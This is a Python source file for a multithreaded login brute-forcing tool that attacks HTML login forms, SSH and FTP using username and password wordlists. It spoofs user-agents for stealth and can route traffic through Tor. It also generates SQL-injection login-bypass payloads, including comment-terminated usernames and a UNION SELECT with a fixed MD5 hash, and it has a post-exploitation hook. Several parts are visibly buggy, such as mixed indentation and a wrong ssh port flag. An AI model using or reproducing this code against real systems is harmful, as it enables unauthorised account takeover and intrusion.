import re
import requests
import threading
from threading import Thread
import time
from console import Console
import random
from bloomfilter import BloomFilter
from ftplib import FTP
import json
try:
	import pexpect
except:
	print('Issues importing \'pexpect\'.. Try: pip install pexpect')

# class: Hive
# description: This object's purpose is a basic layout of what is needed to bruteforce logins
class Hive:
	useTor = None
	UPDATE_TIME = 10
	MAX_HISTORY_SIZE = 400		# *NOTE* Currently Unused
	historyIndex = None 		# *NOTE* Currently Unused
	sharedUsernameList = None
	sharedPasswordList = None
	usernameFile = None
	passwordFile = None
	username = None
	sharedTriedCredentials = None
	isFinished = None
	workerList = None
	passListLength = None
	startTime = None
	threadLock = None
	total_attempts = None
	lastUpdated = None
	verbose = None
	__onSuccessHandle__ = None
	bloomfilter = None		# *NOTE* only used if username is not None, Insures passwords were only used once with the specific username
	target = None
	logLock = None
	attemptLock = None
	
	# function: __init__
	# description: Constructor - *NOTE* Call parent __init__ from any inherited objects from Hive
	def __init__(self):
		self.sharedUsernameList = list()
		self.sharedPasswordList = list()
		self.sharedTriedCredentials = list()
		self.workerList = list()
		self.isFinished = False	
		self.threadLock = threading.Lock()
		self.total_attempts = 0
		# *NOTE* This is initializing self.sharedTriedCredentials filled with null values, with the size of self.MAX_HISTORY_SIZE
		# CURRENTLY self.sharedTriedCredentials IS UNUSED
		for count in range(self.MAX_HISTORY_SIZE): self.sharedTriedCredentials.append(None)
		self.historyIndex = 0
		self.lastUpdated = time.time()
		self.verbose = False
		useTor = False
		self.logLock = threading.Lock()
		self.attemptLock = threading.Lock()

	# function: start
	# param: workers(int)			- The number of threads to create
	# description: Starts the bruteforcing process
	def start(self, workers=1):
		if not self.startTime:
			self.startTime = time.time()
		for count in range(workers):
			thread = Thread(target=self.run, args=())
			self.workerList.append(thread)
		for worker in self.workerList:
			worker.start()
		for worker in self.workerList:
			worker.join()

	# function: getNextUsername - Generator
	# yield: str	- the next username
	# description: yields the next username available
	def getNextUsername(self):
		username = None
		for count in range(len(self.sharedUsernameList)):
			# Ensuring thread safety
			while self.threadLock.locked():
				time.sleep(0.05)
			self.threadLock.acquire()
			try:
				username = self.sharedUsernameList.pop()
			except IndexError or TypeError:
				pass
			finally:
				self.threadLock.release()
				yield username[0]

	# function: __populateLists__
	# description: Populates sharedUsernameList, and sharedPasswordList 
	def __populateLists__(self):
		cleanup_regex = re.compile(r'\s')	
		if not self.username:
			for username in open(self.usernameFile, 'r').readlines():
				username = cleanup_regex.subn('',username)[0]
				username = username.split('\n')
				self.sharedUsernameList.append(username)
		
		for password in open(self.passwordFile, 'r').readlines():
			password = cleanup_regex.subn('', password)[0]
			password = password.split('\n')
			self.sharedPasswordList.append(password)	
		self.sharedUsernameList = sorted(self.sharedUsernameList,reverse=True)
		self.sharedPasswordList = sorted(self.sharedPasswordList,reverse=True)

	# function: getNextPassword 
	# return: (str) | (None) - if last index
	# description: password at position index
	def getNextPassword(self):	
		password = None
		if not self.username:
			for password in self.sharedPasswordList:
				yield password[0]
		else:
			for index in range(len(self.sharedPasswordList)):
				# Ensuring thread Safety
				while self.threadLock.locked():
					time.sleep(0.05)
				with self.threadLock:
					try:
						password = self.sharedPasswordList.pop()
					except IndexError or TypeError:
						pass
					finally:
						yield password[0]		

	# function: getNextCredResults - *NOTE* Not currently implemented
	# yield: Credential
	# description: Yields the next credential that was used to attempt a login
	def getNextCredResults(self):
		while not self.isFinished:
			for credential in self.sharedTriedCredentials:
				if credential is not None:
					yield credential

	# function: setup - Override
	# description: Each object that inherits from Hive should have their own version of this.. Call super objects setup from within
	#	custom Hive object's setup()
	def setup(self):
		self.__populateLists__()
		if self.username:
			self.bloomfilter = BloomFilter(1000000000)

	# function: depositCredResult - *NOTE* Not currently implemented
	# param: credential 	- The credential that was used to attempt a login
	# description: Deposits the credential that was used to attempt a login
	def depositCredResult(self, credential):
		isDepositing = True
		while isDepositing:
			if not self.historyIndex < self.MAX_HISTORY_SIZE:
				self.historyIndex = 0	
			if self.sharedTriedCredentials[self.historyIndex]:
				if not self.sharedTriedCredentials[self.historyIndex].wasSuccess:
					self.sharedTriedCredentials[self.historyIndex] = credential
					self.historyIndex += 1
				else: 
					self.historyIndex += 1
			else:
				self.sharedTriedCredentials[self.historyIndex] = credential
				self.historyIndex += 1
				isDepositing = False

	# function: attemptLogin - Override 	
	# param: Credential	- The credentials to attempt a login with
	# return: Boolean	- Any object that overrides this should return True | False
	# description: Any object that inherits from Hive, should have their own version of this function
	def attemptLogin(self,credential):
		self.total_attempts += 1
		return False

	# function: __displayMessage__
	# param: credential
	# param: success
	# description: Responsible for displaying Login Success/Failure messages, and calls __onSuccessHandle__ for special post exploits if any
	def __displayMessage__(self, credential, success):
		con = Console()
		# Display Login on Success message
		if success:
			self.isFinished = True
			with self.logLock:
				credential.wasSuccess = True
				# Call specialized post exploit function if any
				if self.__onSuccessHandle__:
					self.__onSuccessHandle__(credential)
				# Else just display login success message and exit
				# Ensuring login was a success
				elif self.attemptLogin(credential):
					con = Console()
					message = con.getTimeString() 
					message += con.format(" [+] Login was Successful!!! ",['green','bold'])
					message += "username: %s password: %s "%(con.format(credential.username,['green','bold']),
						con.format(credential.password,['green','bold']))
					print(message)
					exit()
		# Display Authentication Failure message
		else:
			with self.logLock:
				credential.wasSuccess = False
				message = con.getTimeString()
				message += con.format(' [x] Authentication Failure.. ',['red'])
				message += 'username: %s password: %s'%(con.format(credential.username,['bold','red']),
					con.format(credential.password,['bold','red']))
				if self.verbose:
					print(message)	
		# if elapsed time is since last 'show statistics' is longer then self.UPDATE_TIME
		# then display statistics
		if (time.time() - self.lastUpdated) > self.UPDATE_TIME:
				statistics = self.getStatistics()
				statMessage = ''
				statMessage = con.getTimeString()
				statMessage += con.format(' Attack Statistics ',['bold','yellow'])
				for key in statistics.keys():
					statMessage += con.format(key,['dim']) + con.format(': '+statistics[key],['bold']) + ' '
				print(statMessage)

	# function: run
	# description: This function should never be overriden. This is responsible for synchronization between workers.
	# 	This function also displays to the screen the results. Called from self.start() 
	def run(self):
		if not self.username:
			for username in self.getNextUsername():
				for password in self.getNextPassword():
					if not self.isFinished:
						credential = Credential(username,password,self.target)
						success = self.attemptLogin(credential)
						self.__displayMessage__(credential, success)
					else:
						exit()	
		# A specific username was specified, using this username instead of usernames from usernameFile
		else:
			try:
				for password in self.getNextPassword():
					if not self.isFinished:
						# Ensuring the password is used only once with this username
						# -- Bloomfilter has static lookup speed, regardless of list size
						if not self.bloomfilter.inArray(password):
							credential = Credential(self.username,password,self.target)
							success = self.attemptLogin(credential)
							self.__displayMessage__(credential, success)
							self.bloomfilter.append(password)	
					# Finished, there was a successful login
					else:
						exit()
			except TypeError as e:
				pass

	
	# function: getStatistics
	# return: dict
	# description: returns a dictionary of statistics on this attack
	def getStatistics(self):
		elapsed = time.time() - self.startTime
		self.lastUpdated = time.time()
		aps = float(self.total_attempts/elapsed)
		return {'target':self.target,'total-attempts':str(self.total_attempts),'attempts-per-second':'%.2f'%aps,'total-time (seconds)':'%.2f'%elapsed}
	
	# function: setOnSuccessHandle
	# param: handle		- Custom handle to deal with successful logins
	# description: Sets function to call on successful login, for post exploit, or whatever.
	# *NOTE* its important to note that the handle must accept, a Credential object, nothing more nothing less
	def setOnSuccessHandle(self,handle):
		self.__onSuccessHandle__ = handle
	
	# function: setupTOR - Override me
	# description: Each object that inherits from Hive that wishes to use TOR, must explicity set 
	#	it up within their own version of this function. *NOTE* Also keep in mind inside attemptLogin you should do 
	#	the magic of actually using TOR.
	def setupTOR(self):
		pass

# class: Credential
# description: A credential used to attempt a login
class Credential:
	host = None
	port = None
	username = None
	password = None
	wasSuccess = None
	
	def __init__(self,username, password, host, port=None):
		self.username = username
		self.password = password
		self.host = host
		self.port = port
		self.wasSuccess = False
	
	def __str__(self):
		return "%s:%s %s %s %s"%(self.host,self.port,self.username,self.password,str(self.wasSuccess))

# class: HttpHive
# description: HTTP Bruteforce object, capable of bruteforcing html login forms
class HttpHive(Hive):
	# To spoof the user-agent every request
	userAgents = ['Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36',
		      'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586',
		      'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 5.1.1; SHIELD Tablet Build/LMY48C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36',
		      'Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36',
		      'Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
		      'Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22',
		      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
		      'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36',
		      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
		      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
		      'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
		      'Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)',
		      'AppleTV5,3/9.1.1']

	usernameField = None
	passwordField = None
	url = None
	password_field_name = None
	username_field_name = None
	failedbaseline = None
	# Regular-expressions to find the specific forms ----
	FORM_REGEX = re.compile(r'<form(.*?)<\/form>')
        CLEANUP_REGEX = re.compile(r'\n')
        NAME_REGEX = re.compile(r'name\=\"(.*?)\"|name\=\'(.*?)\'') 
        VALUE_REGEX = re.compile(r'value\=\"(.*?)\"|value\=\'(.*?)\'')
        LOGIN_REGEX = re.compile(r'<input\stype\=\"password\"|<input\stype\=\'password\'')
        FIELD_REGEX = re.compile(r'(<input\stype\=.*?>)|(<input\sname\=.*?>)')
	CHECK_TOR_REGEX = re.compile(r'Congratulations\.\sThis\sbrowser\sis\sconfigured\sto\suse\sTor\.')
	AUTHENTICATION_TYPE = re.compile(r'method\=\'(post)\'|method\=\"(post)\"|method\=\'(get)\'|method\=\"(get)\"')
	# Base payload for our login attempts
	basePayload = None
	proxies = None
	form_method = None
	examplePayload = None 
	SQLInjectionFile = None
	SQLInjectionCredentialList = None
	testSQLInjections = None

	def __init__(self):
		Hive.__init__(self)
		failedbaseline = dict()
		self.form_method = 0
		self.examplePayload = ''
		self.testSQLInjections = False
		self.SQLInjectionCredentialList = list()
	
	# function: start
	# param: workers(int)			- The number of threads to create
	# description: Overriden in order to test for SQL injections, if specified.
	def start(self,workers=1):
		self.startTime = time.time()
		if self.testSQLInjections == True:
			threads = list()
			self.SQLInjectionFile = './data/sql-inject.json'
			self.__loadLoginSQLInjection__()
			credlists = list()
			if len(self.SQLInjectionCredentialList) > workers:
				credlists = self.__splitList__(self.SQLInjectionCredentialList,workers)
				for credList in credlists:
					thread = Thread(target=self.__attemptSQLInjection__,args=(credList,))
					threads.append(thread)
				for worker in threads:
					worker.start()
				for worker in threads:
					worker.join()	
			
			else:
				self.__attemptSQLInjection__(self.SQLInjectionCredentialList)
		Hive.start(self,workers)
	

	# function: __findForms__
	# return: [str] 	- array of forms in html code
	# description: Finds all forms on the html page
	def __findForms__(self, html):
		forms = None 
                if self.CLEANUP_REGEX.search(html):
                        html = self.CLEANUP_REGEX.subn('',html)[0]
                        forms = self.FORM_REGEX.findall(html)
                return forms


	# function: __findFields__
	# param: str		- The form to search for fields
	# return: dict 		- fields within the form
	# description: finds all the fields within the form
	def __findFields__(self, form_code):
		fields = list()
                payload = dict()
		try:
                	fields = self.FIELD_REGEX.findall(form_code)
		except: 
			return None
		for array in fields:
			for field in array:
       		                name = ""
                 	        value = ""
                        	if self.NAME_REGEX.search(field):
                                	name = self.NAME_REGEX.findall(field)[0]
					if name[0] == '':
						name = name[1]
					else:
						name = name[0]
                                	if self.LOGIN_REGEX.search(field):
                                        	self.password_field_name = name
                        	if self.VALUE_REGEX.search(field):
                                	value = self.VALUE_REGEX.findall(field)[0]
					if value[0] == '':
						value = value[1]
					else:
						value = value[0]
                        	if len(name) > 0 and len(value) > 0:
                                	payload[name] = value
                        	elif len(name) > 0:
                                	payload[name] = ""
                                	if name != self.password_field_name:
                                        	self.username_field_name = name
		if self.form_method == 0:
			self.examplePayload = payload
		else:
			if not self.username:
				self.examplePayload = self.target + '?%s=%s&%s=%s'%(self.username_field_name,'username_here',self.password_field_name,'password_here')
			else:
				self.examplePayload = self.target + '?%s=%s&%s=%s'%(self.username_field_name,self.username,self.password_field_name,'password_here')
                return payload

	# function: __getLoginForm__ 
	# param: [str]		- An array of html forms
	# return: str		- The login form 
	# description: Finds the form that is a login form
	def __getLoginForm__(self, forms):
		loginform = None
                for form in forms:
			if self.LOGIN_REGEX.search(form):
                		loginform = form
                return loginform


	# function: attemptLogin - Overriden
	# param: Credential		- THe credential to attempt a login with
	# return: Credential
	# description: Attempts a login with the credential
	def attemptLogin(self, credential):
		Hive.attemptLogin(self,credential)
		self.basePayload[self.username_field_name] = credential.username
		self.basePayload[self.password_field_name] = credential.password
		headers = self.getSpoofedHeaders()
		# Using POST method authentication
		if self.form_method == 0:
			response = requests.post(self.target, data=self.basePayload,headers=headers,proxies=self.proxies)	
		# Using GET method authentication
		else:
			response = requests.get(self.target+'?%s=%s&%s=%s'%(self.username_field_name,self.basePayload[self.username_field_name],
									self.password_field_name,self.basePayload[self.password_field_name]),headers=headers,proxies=self.proxies)
		if self.checkSuccess(response):
			return True
		else:
			return False

		
	# function: checkSuccess
	# param: response
	# return: Boolean
	def checkSuccess(self,response):
		success = False
                if response.url != self.failed_dict['url']:
                        self.setFailedBaseline(self.basePayload)
                        if response.url != self.failed_dict['url']:
				if len(self.__findForms__(response.text)) != len(self.failed_dict['forms']):
                                	success = True
                return success

        # function: getFailedBaseline
        # param: dict           - base payload for post request
        # description: Gets the baseline for a failed login
        def setFailedBaseline(self, payload):
                failedbaseline = dict()
                payload[self.username_field_name] = 'user'
                payload[self.password_field_name] = 'pass'
                response = requests.post(self.target, data=payload,headers=self.getSpoofedHeaders(),proxies=self.proxies)
                failedbaseline['response'] = response
                failedbaseline['url'] = response.url
                failedbaseline['html'] = response.text
		failedbaseline['forms'] = self.__findForms__(response.text)
                self.failed_dict = failedbaseline
	
	
	# function: setup - Overriden
	# description: Prepares this Hive for its attack, *NOTE* This must be called before start is called
	def setup(self):
		Hive.setup(self)
		html = requests.get(self.target,headers=self.getSpoofedHeaders(),proxies=self.proxies).text
		forms = self.__findForms__(html)
		login = self.__getLoginForm__(forms)
		self.form_method = self.__checkLoginType__(forms)
		self.basePayload = self.__findFields__(login)
		if self.basePayload:
			self.setFailedBaseline(self.basePayload)
		# Setting handle for post exploitation, to self.postExploit
		self.setOnSuccessHandle(self.postExploit)
		if self.useTor:
			self.setupTOR()
	
	# function: getSpoofedHeaders
	# return: dict		- A dict that represents a user-agent inside the HTTP header
	# description: Returns a spoofed headers, to use with the login. Increases stealth
	def getSpoofedHeaders(self):
		headers = {'Connection':'close','User-Agent':random.choice(self.userAgents)}
		return headers

	# function: postExploit
	# param: credential
	# description: This is an example of a post exploit function, as you can see it requires a credential object
	# In this function you can save the credential to a Database, and continue/quit or whatever
	# You don't need the same signature for every post exploit function, however you do need to use: self.setOnSuccessHandle(somefunction) to set the handle
	def postExploit(self,credential):
		# Ensuring success, *NOTE* currently there is a threading bug that is overwriting parts of memory?
		if self.attemptLogin(credential):
			con = Console()
			message = con.getTimeString()
			message += con.format(" [+] Login was Successful!!! ",['green','bold'])
			message += "username: %s password: %s "%(con.format(credential.username,['green','bold']),con.format(credential.password,['green','bold']))
			print(message)
		exit()
	
	# function: checkTor
	# return: Boolean
	# description: checks to see if TOR is proprely configured
	def checkTor(self):
		isConfigured = False
		if self.useTor:
			self.setupTOR()
		if self.proxies:
			try:
				response = requests.get('https://check.torproject.org/',headers=self.getSpoofedHeaders(),proxies=self.proxies)
				if self.CHECK_TOR_REGEX.search(response.text):
					isConfigured = True	
			except Exception as e:
				print(e)
		return isConfigured 
	
	# function: setupTOR
	# description: Sets up the proxies to use TOR
	def setupTOR(self):
		self.proxies = {'http':'socks5://localhost:9050','https':'socks5://localhost:9050'}
	
	# function: __checkLoginType__
	# param: array		- an array of forms
	# return: int		- 0 for POST and 1 for GET, None for none found	
	# description: Checks the array of forms for the Type of login present
	def __checkLoginType__(self,forms):
		form_method = None
		if self.AUTHENTICATION_TYPE.search(str(forms)):
			ATYPE = self.AUTHENTICATION_TYPE.findall(str(forms))[0]
			if len(ATYPE[0]) > 0 or len(ATYPE[1]) > 0:
				form_method = 0
			elif len(ATYPE[2]) > 0 or len(ATYPE[3]) > 0:
				form_method = 1
		return form_method

	# function: __loadSQLInjectionFields__
	# description: Loads some SQL Injections specific for logins
	def __loadLoginSQLInjection__(self):
		cleanup_regex = re.compile(r'\s')
		with open(self.SQLInjectionFile,'r') as sqlfile:
			sqldata = json.load(sqlfile)
		# Some basic None specific username logins
		for groups in sqldata['logins']:
			username = groups['username']
			password = groups['password']
			cred = Credential(username,password,self.target)
			self.SQLInjectionCredentialList.append(cred)
		# building injections based on supplied username
		if self.username:
			self.SQLInjectionCredentialList += self.__buildSQLInjectionCredentials__(self.username)
			self.SQLInjectionCredentialList = sorted(self.SQLInjectionCredentialList,reverse=True)
		# building injections with supplied username-file
		else:
			for username in open(self.usernameFile, 'r').readlines():
				username = cleanup_regex.subn('',username)[0]
				username = username.split('\n')[0]	
				self.SQLInjectionCredentialList += self.__buildSQLInjectionCredentials__(username)
	
	# function: __buildSQLInjectionCredentials__
	# param: str		- username to build injections with
	# return: [Credential]	- array of SQL Injection based Credentials 
	# description: Builds a list of Credential objects that have SQL injections built around the username supplied
	def __buildSQLInjectionCredentials__(self,username):
		injections = ['%s\' --','%s\' #','%s\'/*','%s\'/**/--','%s\'/**/#']
		new_creds = list()
		for inject in injections:
			user = inject%username
			password = ''	
			cred = Credential(user,password,self.target)
			new_creds.append(cred)
		md5BypassPassword0 = '1234 \' AND 1=0 UNION ALL SELECT \'%s\', \'81dc9bdb52d04dc20036dbd8313ed055'%username
		credential0 = Credential(username,md5BypassPassword0,self.target)
		new_creds.append(credential0)
		md5BypassPassword1 = '1234/**/\'/**/AND/**/1=0/**/UNION/**/ALL/**/SELECT/**/\'%s\',/**/\'81dc9bdb52d04dc20036dbd8313ed055'%username	
		credential1 = Credential(username,md5BypassPassword1,self.target)
		new_creds.append(credential1)
		return new_creds
	
	# function: __attemptSQLInjection__
	# description: Threaded SQL injection login attempt
	def __attemptSQLInjection__(self,credlist):
		for credential in credlist:
			result = self.attemptLogin(credential)
			with self.attemptLock:
				self.__displayMessage__(credential,result)
			if self.isFinished == False:
				self.isFinished = result
			else:
				exit()
				break
			if self.isFinished == True:
				exit()
				break

	# function: __splitList__
	# param: []		- array to split
	# param: splitNum  	- how many arrays to create from the orginal
	# return: [[]]		- 2 dimensional array
	# description: Attempts to split the array into the specified number of arrays, will return one more if the split was not even.
	def __splitList__(self,listToSplit,splitNum):
		lists = list()
		size = len(listToSplit)/splitNum
		endIndex = 0
		for index in range(splitNum):
			startIndex = index*size
			endIndex = startIndex+size	
			lists.append(listToSplit[startIndex:endIndex])
		if endIndex%len(listToSplit) != 0:
			lists.append(listToSplit[endIndex:])
		return lists
	

# class: SSHHive
# description: Hive used to brute-force ssh logins
class SSHHive(Hive):
	baseCommand = None
	TIMEOUT = 0.5
	def __init__(self):
		Hive.__init__(self)
		
	# function: attemptLogin	- Overriden
	# param: Credential		- The credential to attempt a login with	
	# return: Boolean		- True if Success | False if Failure
	# description: This function is responsible for attempting a login with the specified credential, calls other helper functions to get the job done
	def attemptLogin(self,credential):
		Hive.attemptLogin(self,credential)
		success = False
		command = self.__BuildSSHCommand__(credential)
		child = pexpect.spawn(command, timeout=self.TIMEOUT)
		result = child.send(credential.password)
		if result == 8:
			success = True		
		return success
	
	# function: __BuildSSHCommand__ 
	# param: Credential 	- Credential to attempt a login with
	# description: This is responsible for creating a valid ssh login command 
	def __BuildSSHCommand__(self,credential):
		port = 22
		if credential.port:
			port = credential.port		
		command = self.baseCommand%(credential.username,credential.host,port)
		return command
	
	# function: setup
	# description: Prepares this Hive for its attack, *NOTE* This must be called before start is called
	def setup(self):
		Hive.setup(self)
		self.baseCommand = 'ssh %s@%s -P %s'	
		self.verbose = True

	# function: postExploit
	# param: Credential 	- Credential of successful login 
	# description: This is another example of a post exploit function, as you can see it requires a credential object
	def postExploit(self,credential):
		pass
	
# class: FTPHive
# description: Hive used to brute-force FTP Logins
class FTPHive(Hive):
	ftp = None
	def __init__(self):
		Hive.__init__(self)
	
		
	# function: attemptLogin	- Overriden
	# param: credential		- The credential to attempt a login with
	# return: Boolean		- True if Success | False if Failure
	# description: This function is responsible for attempting a login with the specified credential
	def attemptLogin(self, credential):
		success = False
		Hive.attemptLogin(self, credential)
		username = credential.username
		password = credential.password
		host = credential.host
		try:
			self.ftp = FTP(host)
			result = self.ftp.login(username,password)
			# If result then this was a successful login
			if result:
				success = True
			self.ftp.close()
		except:
			pass
		return success 
				
	
	# function: setup
	# description: Prepares this Hive for its attack, *NOTE* This must be called before start is called
	def setup(self):
		Hive.setup(self)	
